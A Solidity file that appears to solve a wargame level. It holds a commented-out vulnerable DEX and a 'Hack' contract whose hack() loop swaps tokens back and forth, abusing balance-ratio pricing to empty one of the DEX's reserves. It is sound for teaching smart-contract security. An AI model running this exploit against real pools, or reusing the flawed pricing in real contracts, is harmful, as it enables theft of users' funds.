// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
// import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
// import "@openzeppelin/contracts/access/Ownable.sol";
//
// contract Dex is Ownable {
//     address public token1;
//     address public token2;
//
//     constructor() {}
//
//     function setTokens(address _token1, address _token2) public onlyOwner {
//         token1 = _token1;
//         token2 = _token2;
//     }
//
//     function addLiquidity(
//         address token_address,
//         uint256 amount
//     ) public onlyOwner {
//         IERC20(token_address).transferFrom(msg.sender, address(this), amount);
//     }
//
//     function swap(address from, address to, uint256 amount) public {
//         require(
//             (from == token1 && to == token2) ||
//                 (from == token2 && to == token1),
//             "Invalid tokens"
//         );
//         require(
//             IERC20(from).balanceOf(msg.sender) >= amount,
//             "Not enough to swap"
//         );
//         uint256 swapAmount = getSwapPrice(from, to, amount);
//         IERC20(from).transferFrom(msg.sender, address(this), amount);
//         IERC20(to).approve(address(this), swapAmount);
//         IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
//     }
//
//     function getSwapPrice(
//         address from,
//         address to,
//         uint256 amount
//     ) public view returns (uint256) {
//         return ((amount * IERC20(to).balanceOf(address(this))) /
//             IERC20(from).balanceOf(address(this)));
//     }
//
//     function approve(address spender, uint256 amount) public {
//         SwappableToken(token1).approve(msg.sender, spender, amount);
//         SwappableToken(token2).approve(msg.sender, spender, amount);
//     }
//
//     function balanceOf(
//         address token,
//         address account
//     ) public view returns (uint256) {
//         return IERC20(token).balanceOf(account);
//     }
// }
//
// contract SwappableToken is ERC20 {
//     address private _dex;
//
//     constructor(
//         address dexInstance,
//         string memory name,
//         string memory symbol,
//         uint256 initialSupply
//     ) ERC20(name, symbol) {
//         _mint(msg.sender, initialSupply);
//         _dex = dexInstance;
//     }
//
//     function approve(address owner, address spender, uint256 amount) public {
//         require(owner != _dex, "InvalidApprover");
//         super._approve(owner, spender, amount);
//     }
// }

interface IDex {
    function token1() external view returns (address);

    function token2() external view returns (address);

    function balanceOf(
        address token,
        address account
    ) external view returns (uint256);

    function getSwapPrice(
        address from,
        address to,
        uint256 amount
    ) external view returns (uint256);

    function swap(address from, address to, uint256 amount) external;

    function approve(address spender, uint256 amount) external;
}

contract Hack {
    IDex public target;

    constructor(address _target) {
        target = IDex(_target);
    }

    function hack() public {
        target.approve(address(target), type(uint256).max);

        address t1 = target.token1();
        address t2 = target.token2();
        address tokenA = t1;
        address tokenB = t2;

        while (
            target.balanceOf(tokenA, address(target)) > 0 &&
            target.balanceOf(tokenB, address(target)) > 0
        ) {
            (tokenA, tokenB) = (tokenB, tokenA);

            uint256 dexBalanceA = target.balanceOf(tokenA, address(target));
            uint256 dexBalanceB = target.balanceOf(tokenB, address(target));

            if (dexBalanceA == 0) {
                break;
            }

            uint256 myBalanceA = target.balanceOf(tokenA, address(this));
            if (myBalanceA == 0) {
                break;
            }

            uint256 outputB = target.getSwapPrice(tokenA, tokenB, myBalanceA);

            uint256 inputA = myBalanceA;
            if (outputB > dexBalanceB) {
                inputA = (dexBalanceB * dexBalanceA) / dexBalanceB;
                if (inputA > myBalanceA) {
                    inputA = myBalanceA;
                }
            }

            target.swap(tokenA, tokenB, inputA);
        }
    }
}
